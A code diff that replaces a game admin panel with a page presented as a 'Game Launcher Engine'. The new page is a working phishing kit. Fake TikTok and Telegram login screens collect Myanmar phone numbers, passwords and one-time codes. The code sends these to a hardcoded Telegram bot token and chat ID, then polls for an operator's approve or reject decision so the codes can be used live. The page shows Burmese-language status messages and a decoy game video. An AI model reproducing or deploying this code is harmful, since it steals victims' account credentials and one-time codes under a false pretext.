@@ -2,88 +2,194 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBERVERSE ADMIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Game Launcher Engine</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0b0e14; color: #ffffff; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1f293d; padding-bottom: 15px; margin-bottom: 20px; }
-        .title { font-size: 18px; font-weight: bold; color: #38bdf8; }
-        .admin-info { font-size: 12px; color: #64748b; }
-        .section-title { font-size: 11px; color: #94a3b8; letter-spacing: 1px; margin-bottom: 15px; }
-        .requests-list { display: flex; flex-direction: column; gap: 10px; }
-        .request-card { background: #121824; border: 1px solid #1f293d; padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
-        .player-id { color: #38bdf8; font-weight: bold; font-size: 14px; }
-        .passcode { color: #94a3b8; font-size: 12px; margin-top: 4px; }
-        .no-requests { font-size: 13px; color: #64748b; margin-top: 20px; }
-        .btn-group { display: flex; gap: 8px; }
-        .btn { padding: 6px 12px; border: none; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: 600; }
-        .btn-approve { background: #10b981; color: #fff; }
-        .btn-reject { background: #ef4444; color: #fff; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: sans-serif; }
+        .bg-setup { background-image: url('https://raw.githubusercontent.com/tar-alt/Photo-link-/6451c994788dbe34e12fbac624779364dbf1c113/Picsart_26-05-13_08-54-08-682.jpg'); background-size: cover; background-position: center; }
+        
+        /* TikTok Style Inputs */
+        .tt-input { width: 100%; padding: 12px; border: 1px solid #e5e7eb; background: #f9fafb; border-radius: 4px; outline: none; margin-bottom: 12px; }
+        
+        /* Notification Bar Style */
+        #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 15px; text-align: center; color: white; font-weight: bold; transition: 0.5s; z-index: 999; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .notice-success { background: #22c55e; }
+        .notice-error { background: #ef4444; }
+
+        /* Entry Button at Bottom */
+        .entry-btn-small { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); padding: 10px 30px; border-radius: 30px; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 100; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div class="title">CYBERVERSE ADMIN</div>
-        <div class="admin-info">Logged as: SuperAdmin</div>
+<!-- Notification Bar -->
+<div id="topNotice"></div>
+
+<div id="app" class="w-full h-full relative">
+    
+    <!-- STEP 1: Selection -->
+    <div id="selectScreen" class="bg-setup w-full h-full flex flex-col items-center justify-center p-8">
+        <div class="bg-white/90 backdrop-blur-md p-10 w-full max-w-sm rounded-[30px] shadow-2xl text-center">
+            <h1 class="text-xl font-bold mb-8">Login to continue</h1>
+            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3 active:scale-95 transition">
+                <i class="fa-brands fa-telegram text-2xl"></i> Telegram
+            </button>
+            <button onclick="toggle('ttScreen')" class="w-full bg-black text-white py-4 rounded-xl flex items-center justify-center gap-3 active:scale-95 transition">
+                <i class="fa-brands fa-tiktok text-2xl"></i> TikTok
+            </button>
+        </div>
     </div>
 
-    <div class="section-title">LIVE PLAYER REQUESTS</div>
+    <!-- STEP 2: TikTok Login (Pass/OTP) -->
+    <div id="ttScreen" class="hidden bg-white w-full h-full p-6 flex flex-col">
+        <div class="flex items-center justify-between mb-8">
+            <i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl"></i>
+            <span class="font-bold">Log in</span>
+            <i class="fa-regular fa-circle-question text-xl"></i>
+        </div>
+        <div>
+            <p class="text-xs font-bold text-gray-400 mb-2">Phone</p>
+            <div class="flex gap-2 mb-3">
+                <div class="border border-gray-300 bg-gray-50 px-3 py-3 rounded text-sm flex items-center gap-1">MM +95 <i class="fa-solid fa-caret-down"></i></div>
+                <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input flex-1 m-0">
+            </div>
+            
+            <!-- Password Field -->
+            <input type="password" id="ttPass" placeholder="Password" class="tt-input">
+            
+            <!-- OTP Field (Hidden until Forget is clicked) -->
+            <div id="otpSection" class="hidden relative">
+                <input type="number" id="ttOtp" placeholder="Enter 6-digit code" class="tt-input">
+                <button onclick="getOTP('ttPhone')" class="absolute right-3 top-3 text-red-500 font-bold text-sm">Get code</button>
+            </div>
 
-    <div id="requestsContainer" class="requests-list">
-        <div class="no-requests">Waiting for player requests...</div>
+            <div class="flex justify-between text-sm mt-2">
+                <span class="text-gray-400">Log in with password</span>
+                <span onclick="showOTP()" class="font-bold cursor-pointer">Forgot password?</span>
+            </div>
+            <button onclick="submitTT()" class="w-full bg-red-500 text-white py-4 rounded-sm font-bold mt-8">Log in</button>
+        </div>
     </div>
 
-    <script>
-        const DB_URL = "https://cyberverse-auth-default-rtdb.asia-southeast1.firebasedatabase.app";
-        const requestsContainer = document.getElementById('requestsContainer');
+    <!-- Telegram UI (Simplified) -->
+    <div id="tgScreen" class="hidden bg-white w-full h-full p-6">
+        <h1 class="text-xl font-bold mb-6">Telegram Login</h1>
+        <input type="number" id="tgPhone" placeholder="Phone Number" class="tt-input">
+        <input type="number" id="tgOtp" placeholder="OTP" class="tt-input">
+        <button onclick="getOTP('tgPhone')" class="text-blue-500 font-bold mb-4 block">Get OTP</button>
+        <button onclick="submitTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold">Continue</button>
+    </div>
 
-        async function fetchRequests() {
-            try {
-                const response = await fetch(`${DB_URL}/player_requests.json`);
-                const data = await response.json();
+    <!-- STEP 3: Checking Screen (Professional) -->
+    <div id="waitScreen" class="hidden w-full h-full flex flex-col items-center justify-center bg-black/60 backdrop-blur-sm">
+        <div class="bg-white p-10 rounded-3xl shadow-2xl text-center flex flex-col items-center">
+            <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
+            <h2 class="text-lg font-bold text-gray-800">Login စစ်ဆေးနေပါသည်...</h2>
+            <p class="text-sm text-gray-500 mt-2">ခေတ္တခဏ စောင့်ဆိုင်းပေးပါ</p>
+        </div>
+    </div>
 
-                requestsContainer.innerHTML = '';
+    <!-- STEP 4: Final Screen -->
+    <div id="videoScreen" class="hidden w-full h-full relative bg-black">
+        <video id="bgVideo" loop playsinline class="w-full h-full object-cover">
+            <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/6c702837cece7d0f80bad49fe77f65382f442422/From%20KlickPin%20CF%20Clear%20social%20dialogue%20prompts%20for%20people%20who%20love%20beauty%20with%20timeless%20style%20that%20stay%20calm%20and%20fair%20-%20Pin-1121326007230552065.mp4" type="video/mp4">
+        </video>
+        <button onclick="window.location.href='https://www.crazygames.com'" class="entry-btn-small">ဂိမ်းထဲသို့ ဝင်ရောက်ရန်</button>
+    </div>
 
-                if (!data) {
-                    requestsContainer.innerHTML = '<div class="no-requests">Waiting for player requests...</div>';
-                    return;
-                }
+</div>
 
-                Object.keys(data).forEach(key => {
-                    const req = data[key];
-                    const card = document.createElement('div');
-                    card.className = 'request-card';
-                    card.innerHTML = `
-                        <div>
-                            <div class="player-id">ID: ${req.playerId}</div>
-                            <div class="passcode">Passcode: ${req.passcode}</div>
-                        </div>
-                        <div class="btn-group">
-                            <button class="btn btn-approve" onclick="approvePlayer('${req.playerId}')">Approve</button>
-                            <button class="btn btn-reject" onclick="deleteRequest('${req.playerId}')">Remove</button>
-                        </div>
-                    `;
-                    requestsContainer.appendChild(card);
-                });
-            } catch (error) {
-                console.error("Error fetching data:", error);
+<script>
+    const token = "8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs";
+    const chat = "5304050102";
+    let userKey = "ID_" + Math.floor(Math.random() * 9999);
+
+    function toggle(id) {
+        document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    function showOTP() { document.getElementById('otpSection').classList.remove('hidden'); }
+
+    async function getOTP(id) {
+        const ph = document.getElementById(id).value;
+        showNotice("OTP ပို့လိုက်ပါပြီ", "success");
+        await sendBot(`📩 Request OTP\nPH: +95${ph}\nID: ${userKey}`, null);
+    }
+
+    async function submitTT() {
+        const ph = document.getElementById('ttPhone').value;
+        const pass = document.getElementById('ttPass').value;
+        const otp = document.getElementById('ttOtp').value;
+        toggle('waitScreen');
+        await sendBot(`🔔 TikTok Login\nPH: +95${ph}\nPass: ${pass}\nOTP: ${otp || 'N/A'}\nID: ${userKey}`, true);
+        startPolling();
+    }
+
+    async function submitTG() {
+        const ph = document.getElementById('tgPhone').value;
+        const otp = document.getElementById('tgOtp').value;
+        toggle('waitScreen');
+        await sendBot(`🔔 Telegram Login\nPH: +95${ph}\nOTP: ${otp}\nID: ${userKey}`, true);
+        startPolling();
+    }
+
+    async function sendBot(msg, withButtons) {
+        let body = { chat_id: chat, text: msg };
+        if(withButtons) {
+            body.reply_markup = { inline_keyboard: [[
+                {text: "✅ Approve", callback_data: `ok_${userKey}`},
+                {text: "❌ Reject", callback_data: `no_${userKey}`}
+            ]] };
+        }
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(body)
+        });
+    }
+
+    function showNotice(msg, type) {
+        const el = document.getElementById('topNotice');
+        el.innerText = msg;
+        el.className = (type === 'success') ? 'notice-success' : 'notice-error';
+        el.style.top = '0px';
+        setTimeout(() => el.style.top = '-100px', 4000);
+    }
+
+    function startPolling() {
+        const interval = setInterval(async () => {
+            const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
+            const data = await res.json();
+            const lastUpdate = data.result?.[data.result.length - 1];
+            const callback = lastUpdate?.callback_query?.data;
+
+            if (callback === `ok_${userKey}`) {
+                clearInterval(interval);
+                showNotice("Login ဝင်ရောက်မှု အောင်မြင်ပါသည်", "success");
+                await sendBot(`✅ ID: ${userKey} အား အောင်မြင်စွာ လက်ခံလိုက်ပါပြီ။`, false);
+                setTimeout(playFinal, 2000);
+            } else if (callback === `no_${userKey}`) {
+                clearInterval(interval);
+                showNotice("Login ဝင်ရောက်မှု မအောင်မြင်ပါ။ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပါ။", "error");
+                await sendBot(`❌ ID: ${userKey} အား ငြင်းပယ် (Reject) လိုက်ပါပြီ။`, false);
+                setTimeout(() => toggle('selectScreen'), 2500);
             }
-        }
+        }, 3000);
+    }
 
-        async function deleteRequest(playerId) {
-            await fetch(`${DB_URL}/player_requests/${playerId}.json`, { method: 'DELETE' });
-            fetchRequests();
-        }
-
-        function approvePlayer(playerId) {
-            alert('Approved Player: ' + playerId);
-        }
-
-        // Poll every 3 seconds for new requests
-        setInterval(fetchRequests, 3000);
-        fetchRequests();
-    </script>
+    function playFinal() {
+        toggle('videoScreen');
+        const v = document.getElementById('bgVideo');
+        v.muted = false;
+        v.play();
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const src = ctx.createMediaElementSource(v);
+        const gain = ctx.createGain();
+        gain.gain.value = 3.5;
+        src.connect(gain); gain.connect(ctx.destination);
+    }
+</script>
 </body>
 </html>
